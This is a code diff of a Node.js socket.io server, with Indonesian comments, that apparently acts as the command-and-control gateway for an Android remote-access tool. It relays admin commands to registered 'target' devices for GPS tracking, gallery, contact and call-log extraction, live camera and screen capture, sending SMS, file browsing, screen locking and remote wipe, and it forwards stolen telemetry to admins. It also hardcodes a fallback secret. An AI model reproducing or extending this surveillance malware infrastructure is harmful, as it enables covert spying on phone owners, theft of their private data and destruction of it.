@@ -1,122 +1,199 @@
-import express from 'express';
-import { createServer } from 'http';
-import { Server, Socket } from 'socket.io';
-import cors from 'cors';
-import { ClientDevice, RelayPayload } from './types';
+import express, { Request, Response } from "express";
+import { createServer } from "http";
+import { Server, Socket } from "socket.io";
+import cors from "cors";
+import * as dotenv from "dotenv";
+import { AdminCommandPayload, ExecutionPayload, ClientTelemetryPayload } from "./types";
+
+// Muat konfigurasi variabel lingkungan (.env)
+dotenv.config();
 
 const app = express();
-app.use(cors({ origin: '*' }));
 
-// Endpoint monitoring untuk menjaga server tetap aktif (Ping/Health Check)
-app.get('/health', (req, res) => {
-  res.status(200).json({ status: 'healthy', timestamp: Date.now() });
+// Keamanan Lintas Batas Domain (CORS Production)
+const allowedOrigins = [
+  "https://rayanxweb-dashboard.vercel.app",
+  "http://localhost:3000"
+];
+
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
+      callback(null, true);
+    } else {
+      callback(new Error("Akses diblokir oleh kebijakan CORS Produksi RAYANXWEB"));
+    }
+  }
+}));
+
+app.use(express.json());
+
+// In-Memory Storage Sesi Real-time
+const connectedClients = new Map<string, string>(); // TargetId -> SocketId
+const activeAdmins = new Set<string>();             // Daftar SocketId Admin
+
+// REST Endpoint: Pemeriksaan Kesehatan Server (Railway Health Check)
+app.get("/", (req: Request, res: Response) => {
+  res.status(200).json({
+    status: "ONLINE",
+    environment: "PRODUCTION",
+    gateway: "RAYANXWEB_CORE_V2",
+    nodesOnline: connectedClients.size,
+    timestamp: Date.now()
+  });
 });
 
 const httpServer = createServer(app);
 const io = new Server(httpServer, {
-  pingTimeout: 30000,
-  pingInterval: 10000,
-  cors: { 
-    origin: '*', 
-    methods: ['GET', 'POST'] 
+  cors: {
+    origin: allowedOrigins,
+    methods: ["GET", "POST"],
+    credentials: true
+  },
+  transports: ["websocket", "polling"],
+  pingTimeout: 60000,
+  pingInterval: 25000
+});
+
+// MIDDLEWARE: Validasi Token Enkripsi Sebelum Handshake Diproses
+io.use((socket: Socket, next) => {
+  const authKey = socket.handshake.headers["x-auth-token"] || socket.handshake.auth?.token;
+  const masterSecret = process.env.GATEWAY_PRODUCTION_SECRET || "814069";
+
+  if (authKey === masterSecret) {
+    return next();
   }
+  console.log(`[SECURITY WARN] Koneksi ilegal diblokir. IP: ${socket.handshake.address}`);
+  return next(new Error("Authentication failure: Invalid Master Token."));
 });
 
-const dashboardSessions = new Set<string>();
-const activeClients = new Map<string, ClientDevice>();
+// LOGIKA PIPELINE INTI WEBOSCKET
+io.on("connection", (socket: Socket) => {
+  const clientType = socket.handshake.query.type as string; 
+  const nodeId = socket.handshake.query.nodeId as string;
 
-io.on('connection', (socket: Socket) => {
-  let sessionType: 'DASHBOARD' | 'CLIENT' | null = null;
-  let clientIdentifier: string | null = null;
+  if (clientType === "admin") {
+    activeAdmins.add(socket.id);
+    console.log(`[ADMIN CONNECTED] ID: ${socket.id} | Total Admin: ${activeAdmins.size}`);
+    socket.emit("gateway_status", { clientsConnected: connectedClients.size });
+  } 
+  
+  if (clientType === "client_device" && nodeId) {
+    connectedClients.set(nodeId, socket.id);
+    console.log(`[NODE CONNECTED] Node terdaftar: ${nodeId} -> Socket: ${socket.id}`);
+    io.to(Array.from(activeAdmins)).emit("node_status_change", { nodeId, status: "ONLINE" });
+  }
 
-  console.log(`[NET-LOG] Tunnel Opened: ${socket.id}`);
+  // PIPA 1: Menerima Instruksi Dashboard, Memetakan Ke 17 Parameter Fitur, & Teruskan ke Klien
+  socket.on("admin_command", (payload: AdminCommandPayload) => {
+    const { targetId, command, options } = payload;
+    const targetSocketId = connectedClients.get(targetId);
 
-  // 1. Handshake Akses untuk Dashboard Web Next.js
-  socket.on('register_dashboard', (data: { token: string }) => {
-    if (data.token !== 'ADMIN_SECURE_TOKEN_XYZ') {
-      socket.emit('auth_error', { message: 'Insecure or invalid token presentation.' });
-      return socket.disconnect(true);
+    if (!targetSocketId) {
+      socket.emit("command_error", { error: `Gagal mengirim: Node ${targetId} Offline.` });
+      return;
     }
-    sessionType = 'DASHBOARD';
-    dashboardSessions.add(socket.id);
-    socket.join('dashboard_pool');
 
-    // Kirim snapshot instan seluruh perangkat online ke dashboard yang baru masuk
-    const snapshots = Array.from(activeClients.entries()).map(([id, dev]) => ({
-      deviceId: id,
-      model: dev.model,
-      connectedAt: dev.connectedAt
-    }));
-    socket.emit('device_snapshot', snapshots);
-    console.log(`[NET-LOG] Dashboard authenticated successfully: ${socket.id}`);
+    let executionPayload: ExecutionPayload = {
+      action: command,
+      params: {},
+      issuedAt: payload.timestamp
+    };
+
+    switch (command) {
+      case "lacak":
+        executionPayload.params = { highAccuracy: true, timeout: 15000 };
+        break;
+      case "notifikasi":
+        executionPayload.params = { 
+          title: options?.title || "Notifikasi Sistem", 
+          body: options?.body || "Pemeriksaan integritas keamanan berkala." 
+        };
+        break;
+      case "gallery":
+        executionPayload.params = { maxCount: 100, sortBy: "date" };
+        break;
+      case "kontak":
+        executionPayload.params = { fields: ["name", "phone"] };
+        break;
+      case "panggilan":
+        executionPayload.params = { limit: 50 };
+        break;
+      case "live_camera":
+        executionPayload.params = { cameraType: options?.cameraType || "back", quality: 80 };
+        break;
+      case "app_mgmt":
+        executionPayload.params = { includeSystemApps: false };
+        break;
+      case "wallpaper":
+        executionPayload.params = { imageUrl: options?.imageUrl || "default.png" };
+        break;
+      case "senter":
+        executionPayload.params = { state: options?.state === "ON" };
+        break;
+      case "kunci_layar":
+        executionPayload.params = { message: "Perangkat terkunci otomatis." };
+        break;
+      case "putar_video":
+        executionPayload.params = { videoUrl: options?.videoUrl || "", autoPlay: true };
+        break;
+      case "file_target":
+        executionPayload.params = { rootPath: options?.path || "/" };
+        break;
+      case "sms":
+        executionPayload.params = { recipient: options?.phone || "", messageText: options?.message || "" };
+        break;
+      case "live_screen":
+        executionPayload.params = { fps: 15, resolution: "720p" };
+        break;
+      case "lock_pro":
+        executionPayload.params = { restrictNavigation: true };
+        break;
+      case "cam_monitor":
+        executionPayload.params = { flash: false, targetCamera: "back" };
+        break;
+      case "reset_data":
+        if (options?.secureToken !== process.env.EMERGENCY_WIPE_TOKEN) {
+          socket.emit("command_error", { error: "Akses Ditolak: Token Keamanan Wipe Salah!" });
+          return;
+        }
+        executionPayload.params = { wipeReason: "Remote wipe triggered by administrator." };
+        break;
+      default:
+        socket.emit("command_error", { error: "Perintah tidak didukung oleh arsitektur matriks." });
+        return;
+    }
+
+    io.to(targetSocketId).emit("execute_action", executionPayload);
+    console.log(`[DISPATCH] Perintah [${command}] diarahkan ke Socket Klien: ${targetSocketId}`);
   });
 
-  // 2. Handshake Akses untuk Android Client App (Sistem Autentikasi PIN)
-  socket.on('register_client', (data: { deviceId: string; pin: string; model: string }) => {
-    if (data.pin !== '814069') {
-      socket.emit('auth_error', { message: 'Authentication PIN mismatch.' });
-      return socket.disconnect(true);
-    }
-    sessionType = 'CLIENT';
-    clientIdentifier = data.deviceId;
-
-    activeClients.set(data.deviceId, {
-      socketId: socket.id,
-      pin: data.pin,
-      model: data.model || 'Generic Android Target',
-      connectedAt: Date.now(),
-      status: 'online'
+  // PIPA 2: Menerima Telemetri dari Klien untuk Disebarkan ke Seluruh Admin Aktif
+  socket.on("client_telemetry_data", (payload: ClientTelemetryPayload) => {
+    io.to(Array.from(activeAdmins)).emit("receive_telemetry", {
+      from: payload.nodeId,
+      payload: payload.data,
+      receivedAt: Date.now()
     });
-
-    socket.join('client_pool');
-    
-    // Kabarkan ke dashboard bahwa device telah online
-    io.to('dashboard_pool').emit('device_online', {
-      deviceId: data.deviceId,
-      model: data.model,
-      connectedAt: Date.now()
-    });
-    console.log(`[NET-LOG] Target Device linked successfully: ${data.deviceId} (${data.model})`);
   });
 
-  // 3. Sistem Pengukuran Latensi (Ping Checker)
-  socket.on('ping_check', (callback: () => void) => {
-    if (typeof callback === 'function') callback();
-  });
-
-  // 4. Hub Penyalur (Relay) Instan untuk 17 Fitur Kontrol Utama
-  socket.on('relay_instruction', (payload: RelayPayload) => {
-    // Pastikan yang mengirim perintah benar-benar sesi dashboard valid
-    if (!dashboardSessions.has(socket.id)) return;
-
-    const target = activeClients.get(payload.targetId);
-    if (target) {
-      // Teruskan instruksi secara real-time langsung ke Socket ID Android Client tujuan
-      io.to(target.socketId).emit('execute_payload', {
-        action: payload.action,
-        params: payload.params || {}
-      });
-      console.log(`[NET-LOG] Relay command [${payload.action.toUpperCase()}] piped to Device: ${payload.targetId}`);
+  // PENANGANAN DISKONEKSI (Pembersih Sampah Memori Sesi Klien)
+  socket.on("disconnect", () => {
+    if (activeAdmins.has(socket.id)) {
+      activeAdmins.delete(socket.id);
+      console.log(`[ADMIN DISCONNECTED] ID: ${socket.id} | Sisa Admin: ${activeAdmins.size}`);
     }
-  });
 
-  // 5. Otomatisasi Pembersihan Sesi Memori Saat Terputus (Anti-Leak)
-  socket.on('disconnect', (reason) => {
-    if (sessionType === 'DASHBOARD') {
-      dashboardSessions.delete(socket.id);
-      console.log(`[NET-LOG] Dashboard disconnected: ${socket.id} (${reason})`);
-    } else if (sessionType === 'CLIENT' && clientIdentifier) {
-      activeClients.delete(clientIdentifier);
-      // Beritahu dashboard secara instan bahwa device offline tanpa perlu refresh halaman
-      io.to('dashboard_pool').emit('device_offline', { deviceId: clientIdentifier });
-      console.log(`[NET-LOG] Target Device disconnected: ${clientIdentifier} (${reason})`);
+    if (clientType === "client_device" && nodeId) {
+      connectedClients.delete(nodeId);
+      console.log(`[NODE DISCONNECTED] Node keluar: ${nodeId}`);
+      io.to(Array.from(activeAdmins)).emit("node_status_change", { nodeId, status: "OFFLINE" });
     }
   });
 });
 
-const PORT = process.env.PORT || 4000;
+// Jalankan Alokasi Port Produksi Server
+const PORT = process.env.PORT || 8080;
 httpServer.listen(PORT, () => {
-  console.log(`=============================================================`);
-  console.log(` RAYANXWEB NETWORK GATEWAY (PROYEK 1) RUNNING ON PORT ${PORT}`);
-  console.log(`=============================================================`);
+  console.log(`[SERVER ACTIVE] RAYANXWEB Production Gateway mengudara di Port: ${PORT}`);
 });
